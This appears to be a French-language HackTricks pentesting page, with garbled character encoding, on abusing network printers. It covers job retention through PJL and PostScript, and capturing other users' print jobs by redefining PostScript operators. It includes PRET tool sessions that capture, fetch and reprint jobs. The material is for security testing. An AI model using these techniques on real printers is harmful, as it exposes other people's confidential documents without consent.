<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©**? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks**? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# Conservation des travaux d'impression

Certains imprimantes stockent des travaux d'impression accessibles depuis le serveur web. Cependant, la conservation des travaux doit Ãªtre activÃ©e explicitement pour un certain travail d'impression et peut Ãªtre effectuÃ©e Ã  l'aide de commandes PJL standard ou de code PostScript propriÃ©taire. Les travaux sont ensuite conservÃ©s en mÃ©moire et peuvent Ãªtre rÃ©imprimÃ©s depuis le panneau de commande.

## PJL

La conservation lÃ©gitime des travaux peut Ãªtre activÃ©e pour le document en cours en dÃ©finissant la variable PJL HOLD comme indiquÃ© ci-dessous:
```
@PJL SET HOLD=ON
[actual data to be printed follows]
```
Les travaux en attente sont conservÃ©s en mÃ©moire et peuvent Ãªtre rÃ©imprimÃ©s Ã  partir du panneau de commande de l'imprimante. Cette fonctionnalitÃ© est prise en charge par diverses imprimantes, cependant, il semble que seuls certains appareils Epson permettent la conservation permanente des travaux en attente en utilisant `@PJL DEFAULT HOLD=ON`.

**Comment tester cette attaque?**

Utilisez la commande `hold` de [**PRET**](https://github.com/RUB-NDS/PRET) en mode pjl pour vÃ©rifier si la conservation permanente des travaux peut Ãªtre activÃ©e :
```
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Setting job retention, reconnecting to see if still enabled
Retention for future print jobs: OFF
```
## PostScript

PostScript offre une fonctionnalitÃ© similaire qui est cependant spÃ©cifique au modÃ¨le et au fournisseur. Pour les sÃ©ries HP LaserJet 4k et diverses imprimantes Kyocera, la rÃ©tention de tÃ¢ches peut Ãªtre activÃ©e en prÃ©fixant les commandes suivantes Ã  un document PostScript :
```
<< /Collate true /CollateDetails
<< /Hold 1 /Type 8 >> >> setpagedevice
```
Bien qu'il soit thÃ©oriquement possible d'activer en permanence la rÃ©tention des travaux PostScript Ã  l'aide de l'opÃ©rateur [startjob](./#postscript-ps), ce paramÃ¨tre est explicitement rÃ©initialisÃ© par CUPS au dÃ©but de chaque travail d'impression Ã  l'aide de `<< /Collate false >> setpagedevice`. Pour contrer ce mÃ©canisme de protection, l'attaquant peut redÃ©finir de maniÃ¨re permanente l'opÃ©rateur `setpagedevice` pour qu'il n'ait aucun effet.

**Comment tester cette attaque?**

Utilisez la commande `hold` de [**PRET**](https://github.com/RUB-NDS/PRET) en mode ps :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> hold
Job retention enabled.
```
# Capture de travaux d'impression

Il est possible mais peu courant d'activer la rÃ©tention de travaux dans la boÃ®te de dialogue d'impression comme discutÃ© ci-dessus. Cependant, avec PostScript, on a un accÃ¨s complet sur le travail d'impression en cours et avec l'opÃ©rateur [startjob](./#postscript-ps), il est mÃªme possible de sortir de la boucle du serveur et d'accÃ©der aux travaux futurs. Une telle fonctionnalitÃ© a le potentiel de capturer tous les documents si PostScript est utilisÃ© comme pilote d'imprimante.

## PostScript

Avec la capacitÃ© de se connecter Ã  des opÃ©rateurs PostScript arbitraires, il est possible de manipuler et d'accÃ©der Ã  des travaux d'impression Ã©trangers. Pour **analyser le flux de donnÃ©es rÃ©el envoyÃ© Ã  l'imprimante**, on peut appliquer une fonctionnalitÃ© assez cool du langage PostScript : lire son propre code de programme en tant que donnÃ©es en utilisant l'opÃ©rateur `currentfile`. De cette faÃ§on, tout le flux de donnÃ©es Ã  traiter par l'interprÃ©teur PostScript peut Ãªtre accÃ©dÃ© en le lisant et en le stockant dans un fichier sur le pÃ©riphÃ©rique d'impression. Si l'imprimante ne propose pas d'accÃ¨s au systÃ¨me de fichiers, les **documents capturÃ©s peuvent Ãªtre stockÃ©s en mÃ©moire**, par exemple dans des dictionnaires PostScript permanents. \
Un problÃ¨me pratique est de dÃ©cider **quel opÃ©rateur doit Ãªtre connectÃ©** car on n'a pas accÃ¨s au flux de donnÃ©es jusqu'Ã  ce que cet opÃ©rateur soit traitÃ© par l'interprÃ©teur PostScript. Comme un attaquant veut capturer des travaux d'impression dÃ¨s le dÃ©but, l'**opÃ©rateur redÃ©fini doit Ãªtre le tout premier opÃ©rateur** contenu dans le document PostScript. Heureusement, tous les documents imprimÃ©s avec CUPS sont pressÃ©s dans une structure fixe commenÃ§ant par `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. En se basant sur l'hypothÃ¨se d'une telle structure fixe, l'attaquant peut capturer des documents dÃ¨s le dÃ©but et exÃ©cuter (aka imprimer) le fichier par la suite. Pour les systÃ¨mes d'impression **autres que CUPS**, cette attaque devrait Ã©galement Ãªtre possible, mais **les opÃ©rateurs doivent Ãªtre adaptÃ©s**. Notez que l'en-tÃªte PostScript qui inclut gÃ©nÃ©ralement la taille du support, les noms d'utilisateur et de travail ne peut pas Ãªtre capturÃ© en utilisant cette mÃ©thode car nous nous connectons d'abord au dÃ©but du document rÃ©el. Une stratÃ©gie gÃ©nÃ©rique pour se connecter au dÃ©but de chaque travail d'impression est de dÃ©finir le paramÃ¨tre systÃ¨me `BeginPage`, s'il est pris en charge par l'imprimante (la plupart des imprimantes le font). Cette vulnÃ©rabilitÃ© est probablement prÃ©sente dans les pÃ©riphÃ©riques d'impression depuis des dÃ©cennies car seules les constructions de langage dÃ©finies par la norme PostScript sont abusÃ©es.

Utilisez la commande `capture` de [**PRET**](https://github.com/RUB-NDS/PRET) en mode ps :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.

printer:/> capture 
Print job operations:  capture <operation>
  capture start   - Record future print jobs.
  capture stop    - End capturing print jobs.
  capture list    - Show captured print jobs.
  capture fetch   - Save captured print jobs.
  capture print   - Reprint saved print jobs.
printer:/> capture start
Future print jobs will be captured in memory!
printer:/> exit
```
Maintenant, imprimez des documents arbitraires (assurez-vous que PRET est dÃ©connectÃ© pour ne pas bloquer le canal d'impression). Ensuite, vous pouvez rÃ©pertorier, rÃ©cupÃ©rer ou rÃ©imprimer les documents capturÃ©s :
```
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> capture list
Free virtual memory: 16.6M | Limit to capture:  5.0M
date          size  user           jobname                 creator             
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Jan 25 18:38  3.1M  -              -                       -                   
Jan 25 18:40  170K  -              -                       -                   
printer:/> capture fetch
Receiving capture/printer/690782792
3239748 bytes received. 
Receiving capture/printer/690646210
174037 bytes received.
printer:/> capture print
printing...
printing...
2 jobs reprinted
printer:/> capture stop
Stopping job capture, deleting recorded jobs
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
